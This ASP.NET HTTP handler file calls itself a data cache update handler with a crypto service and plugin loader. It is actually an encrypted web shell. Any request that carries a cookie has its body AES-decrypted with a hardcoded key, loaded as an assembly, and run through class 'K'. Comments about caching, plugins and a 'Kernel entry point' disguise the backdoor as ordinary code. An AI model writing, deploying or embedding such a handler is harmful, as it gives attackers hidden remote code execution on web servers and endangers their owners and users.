<%@ WebHandler Language="C#" Class="DataCacheHandler" %>
using System;
using System.Web;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;

/// <summary>
/// Provides a cryptographic service for data encryption and decryption.
/// This is used to secure cache payloads during transit.
/// </summary>
public static class CryptoService
{
    // Retrieves the symmetric key from a secure configuration source.
    private static byte[] GetSymmetricKey()
    {
        // In a real scenario, this key would be fetched from a secure vault.
        // For this module, we use a static key derived from the application ID.
        string appId = "ca63457538b9b1e0";
        return Encoding.UTF8.GetBytes(appId);
    }

    /// <summary>
    /// Decrypts a given byte array payload using the application's standard AES algorithm.
    /// </summary>
    /// <param name="encryptedPayload">The encrypted data to be decrypted.</param>
    /// <returns>The decrypted data as a byte array.</returns>
    public static byte[] DecryptPayload(byte[] encryptedPayload)
    {
        byte[] key = GetSymmetricKey();
        using (var aes = new RijndaelManaged())
        {
            // The IV is derived from the same key for simplicity in this context.
            ICryptoTransform decryptor = aes.CreateDecryptor(key, key);
            return decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
        }
    }
}

/// <summary>
/// A generic plugin loader for dynamically loading and executing content processors.
/// </summary>
public class PluginLoader
{
    private readonly Assembly _pluginAssembly;

    /// <summary>
    /// Initializes the loader with a decrypted plugin assembly.
    /// </summary>
    /// <param name="assemblyBytes">The raw bytes of the assembly to load.</param>
    public PluginLoader(byte[] assemblyBytes)
    {
        _pluginAssembly = Assembly.Load(assemblyBytes);
    }

    /// <summary>
    /// Executes the primary entry point of the loaded plugin.
    /// </summary>
    /// <param name="context">The context object to pass to the plugin's entry point.</param>
    public void Run(object context)
    {
        // 'K' is the standard name for the Kernel entry point class in our plugin architecture.
        object pluginInstance = _pluginAssembly.CreateInstance("K");
        if (pluginInstance != null)
        {
            // The 'Equals' method is overridden by plugins to serve as the main execution entry point.
            // This is a convention for our dynamic plugin system.
            pluginInstance.Equals(context);
        }
    }
}

/// <summary>
/// Main HTTP handler for processing incoming data cache update requests.
/// It expects an encrypted payload and a valid client cookie.
/// </summary>
public class DataCacheHandler : IHttpHandler
{
    /// <summary>
    /// Processes the incoming HTTP request.
    /// </summary>
    public void ProcessRequest(HttpContext context)
    {
        // We only process requests from clients that have established a session (indicated by a cookie).
        if (context.Request.Cookies.Count == 0)
        {
            return; // Ignore requests without a session cookie.
        }

        int payloadLength = context.Request.ContentLength;
        byte[] encryptedCachePayload = context.Request.BinaryRead(payloadLength);

        if (encryptedCachePayload.Length > 0)
        {
            // Decrypt the payload to get the raw cache data and instructions.
            byte[] decryptedAssemblyBytes = CryptoService.DecryptPayload(encryptedCachePayload);

            // Load and run the specific cache update logic from the payload.
            var loader = new PluginLoader(decryptedAssemblyBytes);
            loader.Run(context);
        }
    }
    
    /// <summary>
    /// Handlers are stateful and should not be reused.
    /// </summary>
    public bool IsReusable { get { return false; } }
}